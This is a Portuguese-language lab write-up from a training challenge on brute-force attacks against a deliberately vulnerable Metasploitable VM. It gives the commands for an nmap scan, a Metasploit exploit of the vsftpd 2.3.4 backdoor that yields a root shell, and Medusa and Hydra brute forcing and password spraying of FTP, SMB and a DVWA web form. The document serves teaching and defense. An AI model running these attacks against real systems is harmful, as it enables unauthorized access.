# Desafio DIO — Simulando Ataques de Brute Force com Medusa e Kali Linux

## 📚 Índice

- [Introdução](#-introdução)
- [Objetivos](#-objetivos)
- [Tipos de Ataques](#-tipos-de-ataques)
  - [Ataque de Dicionário](#ataque-de-dicionário)
  - [Brute Force](#brute-force-força-bruta)
  - [Ataque Híbrido](#ataque-híbrido)
  - [Password Spraying](#password-spraying)
  - [Credential Stuffing](#credential-stuffing)
- [Ferramentas Utilizadas](#-ferramentas-utilizadas)
- [Ambiente do Laboratório](#-ambiente-do-laboratório)
- [Enumeração de Serviços com Nmap](#-enumeração-de-serviços-com-nmap)
- [Exploração da Vulnerabilidade vsFTPd 234](#-exploração-da-vulnerabilidade-vsftpd-234)
- [Ataque FTP com Medusa](#-ataque-ftp-com-medusa)
- [Validação do Acesso FTP](#-validação-do-acesso-ftp)
- [Brute Force em Formulários Web](#-brute-force-em-formulários-web)
- [Enumeração SMB e Password Spraying](#-enumeração-smb-e-password-spraying)
- [Boas Práticas de Segurança](#-boas-práticas-de-segurança)
- [Conclusão](#-conclusão)
- [Aviso Ético](#-aviso-ético)

---

# 📚 Tipos de Ataques (Anotações Teóricas das Aulas)

> Esta seção reúne conceitos teóricos estudados durante as aulas do desafio da DIO.  
> Nem todas as técnicas apresentadas foram utilizadas diretamente no laboratório prático.

---

## Ataque de Dicionário

Consiste na utilização de listas conhecidas de senhas para tentativa de autenticação.

### Exemplos

- Senhas comuns
- Vazamentos públicos
- Palavras frequentes

### Vantagens

- Rápido
- Baixo custo computacional

### Desvantagens

- Ineficaz contra senhas fortes

---

## Brute Force (Força Bruta)

Técnica baseada em testar todas as combinações possíveis de caracteres.

### Características

- Alto custo computacional
- Pode levar muito tempo
- Maior chance de detecção

### Exemplo

```text
a
aa
aaa
aab
aac
...
```

---

## Ataque Híbrido

Combina listas de palavras com regras de modificação.

### Mangling Rules

Substituição de caracteres.

### Exemplos

```text
password
P@ssword
P4ssw0rd
```

### Junção de Listas

Combinação de palavras e números.

### Exemplos

```text
admin123
welcome2026
root@123
```

---

## Password Spraying

Técnica que testa uma senha fraca contra vários usuários diferentes.

### Objetivo

Evitar:

- Bloqueio de contas
- Detecção por excesso de tentativas

### Exemplo

```text
Senha testada:
Welcome123

Usuários:
user1
user2
user3
```

---

## Credential Stuffing

Uso de credenciais vazadas em outros serviços.

### Funcionamento

O atacante aproveita a reutilização de senhas entre diferentes plataformas.

### Exemplo

```text
E-mail + senha vazados em um site
↓
Tentativa automática em outros serviços
```

---

# 🛠 Ferramentas Citadas nas Aulas (Parte Teórica)

> As ferramentas abaixo foram apresentadas durante as aulas como exemplos de ferramentas utilizadas em testes de autenticação, brute force e auditoria de segurança.
>
> Nem todas foram utilizadas diretamente no laboratório deste desafio.

| Ferramenta | Finalidade |
|---|---|
| Hydra | Ataques de autenticação |
| Medusa | Brute force paralelo |
| Nmap | Enumeração de serviços |
| Enum4Linux | Enumeração SMB |
| Metasploit | Exploração de vulnerabilidades |
| John the Ripper | Quebra de hashes |
| Ncrack | Ataques distribuídos |
| WPScan | Auditoria WordPress |
| Patator | Ataques customizados |

---

# 🧪 Ferramentas Utilizadas no Laboratório

Durante a execução prática do desafio, foram utilizadas as seguintes ferramentas:

| Ferramenta | Utilização no Projeto |
|---|---|
| Nmap | Enumeração de portas e serviços |
| Metasploit | Exploração da vulnerabilidade do vsFTPd |
| Medusa | Ataques de autenticação |
| Hydra | Teste de brute force em formulário web |
| Enum4Linux | Enumeração SMB |
| FTP Client | Validação das credenciais obtidas |

---

# 🖥 Ambiente do Laboratório

O ambiente foi montado utilizando:

- 1 VM Kali Linux
- 1 VM Metasploitable 2

## Configuração da Rede

As máquinas foram configuradas em modo **Host-Only**.

### O que é Host-Only?

Esse modo cria uma rede isolada entre as máquinas virtuais, impedindo acesso externo à internet.

## Vantagens

- Ambiente seguro
- Isolamento da rede
- Ideal para laboratórios

---

## Configuração IP

```text
Kali Linux      → 192.168.1.X
Metasploitable  → 192.168.1.10
```

---

# 🔎 Enumeração de Serviços com Nmap

Após validar a conectividade entre as máquinas, foi realizado um scan nas principais portas do alvo.

## Comando Utilizado

```bash
nmap -sV -p 21,22,80,445,139 192.168.1.10
```

## Explicação dos Parâmetros

| Parâmetro | Função |
|---|---|
| `-sV` | Detecta versão dos serviços |
| `-p` | Define portas específicas |

---

## Resultado do Scan

```text
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1
80/tcp  open  http        Apache httpd 2.2.8
139/tcp open  netbios-ssn Samba smbd
445/tcp open  netbios-ssn Samba smbd
```

---

## Análise dos Serviços

| Porta | Serviço | Risco |
|---|---|---|
| 21 | FTP | Transmissão insegura de credenciais |
| 22 | SSH | Possível brute force |
| 80 | HTTP | Vulnerabilidades web |
| 139/445 | SMB | Enumeração e acesso indevido |

---

# 💥 Exploração da Vulnerabilidade vsFTPd 2.3.4

Foi identificada a versão vulnerável do serviço FTP:

```text
vsFTPd 2.3.4
```

## Sobre a Vulnerabilidade

Essa versão possui um backdoor conhecido inserido maliciosamente no código-fonte oficial do serviço.

O backdoor permite execução remota de comandos quando acionado corretamente.

---

## Exploração com Metasploit

### Inicialização do Framework

```bash
msfconsole
```

### Busca pelo Exploit

```bash
search vsftpd 2.3.4
```

### Seleção do Módulo

```bash
use 0
```

### Definição do Alvo

```bash
set RHOSTS 192.168.1.10
```

### Verificação das Configurações

```bash
options
```

### Execução do Exploit

```bash
exploit
```

---

## Validação do Acesso

Após a abertura da shell:

```bash
whoami
```

## Resultado

```text
root
```

---

# 🔓 Ataque FTP com Medusa

## Criação da Lista de Usuários

```bash
echo -e "user\nmsfadmin\nroot" > users.txt
```

## Criação da Lista de Senhas

```bash
echo -e "123456\npassword\nquerty\nmsfadmin" > pass.txt
```

---

## Execução do Ataque

```bash
medusa -h 192.168.1.10 -U users.txt -P pass.txt -M ftp -t 6
```

---

## Explicação dos Parâmetros

| Parâmetro | Função |
|---|---|
| `-h` | Host alvo |
| `-U` | Lista de usuários |
| `-P` | Lista de senhas |
| `-M` | Módulo utilizado |
| `-t` | Número de threads |

---

## Resultado

```text
ACCOUNT FOUND:
Host: 192.168.1.10
User: msfadmin
Password: msfadmin
```

---

## Análise

A autenticação foi bem-sucedida porque o ambiente utiliza credenciais fracas e previsíveis.

### Problemas Identificados

- Senha igual ao usuário
- Ausência de MFA
- Sem bloqueio por tentativas

---

# 📂 Validação do Acesso FTP

Após identificar as credenciais válidas, foi realizado login manual no serviço FTP.

## Comando

```bash
ftp 192.168.1.10
```

## Login

```text
Name: msfadmin
Password: msfadmin
```

## Resultado

```text
230 Login successful.
```

---

# 🌐 Brute Force em Formulários Web

Foi realizado um teste contra o formulário de login da DVWA.

---

## Teste com Hydra

### Comando

```bash
hydra -L users.txt -P pass.txt 192.168.1.10 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
```

## Resultado

```text
0 valid password found
```

---

## Possível Motivo da Falha

O formulário DVWA pode utilizar:

- Tokens CSRF
- Cookies de sessão
- Redirecionamentos
- Campos ocultos

Esses mecanismos dificultam ataques automatizados simples.

---

# Teste com Medusa

## Comando

```bash
medusa -h 192.168.1.10 \
-U users.txt \
-P pass.txt \
-M web-form \
-m FORM:/dvwa/login.php \
-m DENY:"Login failed"
```

---

## Resultado

```text
WARNING: Invalid method: DENY.
```

Mesmo com o aviso, o Medusa retornou vários falsos positivos.

---

## Motivo Técnico do Falso Positivo

O módulo `web-form` exige configuração correta da resposta HTTP esperada.

Como o parâmetro `DENY` foi utilizado incorretamente:

- O Medusa interpretou qualquer resposta como sucesso
- Não houve validação adequada do conteúdo retornado
- Todas as tentativas foram marcadas como válidas

---

## Comparação Hydra vs Medusa

| Ferramenta | Pontos Fortes | Limitações |
|---|---|---|
| Hydra | Melhor suporte HTTP | Configuração mais detalhada |
| Medusa | Alta velocidade | Menos intuitivo em formulários web |

---

# 🧩 Enumeração SMB e Password Spraying

Foi utilizada a ferramenta `Enum4Linux` para enumeração SMB.

---

## Enumeração SMB

### Comando

```bash
enum4linux -a 192.168.1.10 | tee enum4_output.txt
```

---

## Objetivo

O comando realizou:

- Enumeração de usuários
- Informações SMB
- Compartilhamentos
- Política de senhas

Além disso, salvou toda a saída em um arquivo:

```text
enum4_output.txt
```

---

# Criação das Listas

## Usuários

```bash
echo -e "user\nmsfadmin\nservice" > smb_users.txt
```

## Senhas

```bash
echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt
```

---

# Execução do Password Spraying

## Comando

```bash
medusa -h 192.168.1.10 \
-U smb_users.txt \
-P senhas_spray.txt \
-M smbnt
```

---

## Objetivo da Técnica

Em vez de testar muitas senhas para um único usuário:

- Testa poucas senhas
- Em muitos usuários diferentes

Isso reduz:

- Alertas de segurança
- Bloqueio de contas

---

# 🔐 Boas Práticas de Segurança

## Políticas de Senha

- Senhas longas
- Caracteres especiais
- Não reutilizar senhas

---

## MFA (Autenticação Multifator)

Adiciona uma camada extra de proteção mesmo em caso de vazamento de senha.

---

## Rate Limiting

Limita tentativas de login em curto período.

---

## Bloqueio de Conta

Bloqueia usuários após várias tentativas falhas.

---

## Monitoramento

Monitorar:

- Tentativas de login
- Origem dos acessos
- Comportamentos suspeitos

---

# ✅ Conclusão

Durante o laboratório foi possível praticar:

- Enumeração de serviços
- Exploração de vulnerabilidades
- Ataques de brute force
- Password spraying
- Validação de credenciais

O projeto demonstrou como:

- Serviços vulneráveis
- Senhas fracas
- Má configuração

podem comprometer completamente um ambiente.

Além disso, mostrou a importância de:

- Políticas de segurança
- Hardening
- Monitoramento
- Controle de autenticação

---

# ⚠ Aviso Ético

> Este conteúdo foi desenvolvido exclusivamente para fins educacionais e em ambiente controlado.
>
> A utilização dessas técnicas sem autorização é ilegal e antiética.
>
> Sempre realize testes apenas em ambientes autorizados.
